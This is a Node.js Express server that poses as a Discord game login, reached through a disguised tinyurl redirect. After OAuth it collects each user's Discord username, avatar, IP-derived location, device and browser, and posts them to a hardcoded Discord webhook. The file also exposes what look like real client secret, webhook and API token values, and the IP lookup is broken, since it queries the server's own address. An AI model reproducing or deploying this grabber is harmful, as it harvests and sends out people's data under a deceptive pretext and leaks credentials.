const express = require('express');
const axios = require('axios');
const qs = require('querystring');
const app = express();
const port = process.env.PORT || 3000;

// Discord OAuth2 credentials
const clientId = '1328323151330938910';
const clientSecret = 'OuNiL3Z79GqGJqeLbh_gExtA3ABNGABj';
const redirectUri = 'https://tinyurl.com/Lucas-play-game';  // Your redirect URL
const webhookURL = 'https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs';
const ipInfoToken = 'abfa2c858d87e3';  // Your IP info token

// Step 1: Redirect to Discord OAuth2 page
app.get('/login', (req, res) => {
  const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
  res.redirect(authUrl);
});

// Step 2: Handle OAuth2 callback and fetch user data
app.get('/discord/callback', async (req, res) => {
  const code = req.query.code;

  if (!code) {
    return res.status(400).send('No authorization code provided.');
  }

  try {
    // Step 3: Exchange code for access token
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', qs.stringify({
      client_id: clientId,
      client_secret: clientSecret,
      code: code,
      grant_type: 'authorization_code',
      redirect_uri: redirectUri,
    }), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    const { access_token } = tokenResponse.data;

    // Step 4: Fetch user data from Discord
    const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': `Bearer ${access_token}`
      }
    });

    const user = userResponse.data;
    const username = user.username;
    const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;

    // Collect user IP and device info
    const ipInfo = await axios.get('https://ipinfo.io/json?token=' + ipInfoToken); // Replace with your IP info token
    const { ip, city, region, country } = ipInfo.data;

    const userAgent = req.headers['user-agent'];
    let deviceType = "Unknown";
    let browser = "Unknown";

    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
      deviceType = "Mobile";
    } else {
      deviceType = "Desktop";
    }

    if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
    else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
    else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
    else if (userAgent.indexOf("Edge") > -1) browser = "Edge";

    // Prepare Discord message with all user data
    const message = {
      content: "New user data collected!",
      embeds: [
        {
          title: `User: ${username}`,
          description: "Here is the user's data.",
          color: 0xFFFFFF,
          fields: [
            { name: "IP Address", value: ip, inline: true },
            { name: "City", value: city || "Unknown", inline: true },
            { name: "Region", value: region || "Unknown", inline: true },
            { name: "Country", value: country || "Unknown", inline: true },
            { name: "Device Type", value: deviceType, inline: true },
            { name: "Browser", value: browser, inline: true },
            { name: "Discord Username", value: username, inline: true },
            { name: "Discord Avatar", value: `[Click here to view avatar](${avatarUrl})`, inline: true },
          ],
        },
      ],
    };

    // Send the data to Discord webhook
    await axios.post(webhookURL, message);

    // Respond with success message
    res.send('<h1>Thank you for logging in!</h1><p>Your data has been sent to Discord.</p>');
  } catch (error) {
    console.error(error);
    res.status(500).send('Error occurred while fetching data.');
  }
});

// Serve static files (e.g., frontend)
app.use(express.static('public'));

// Listen on the port
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});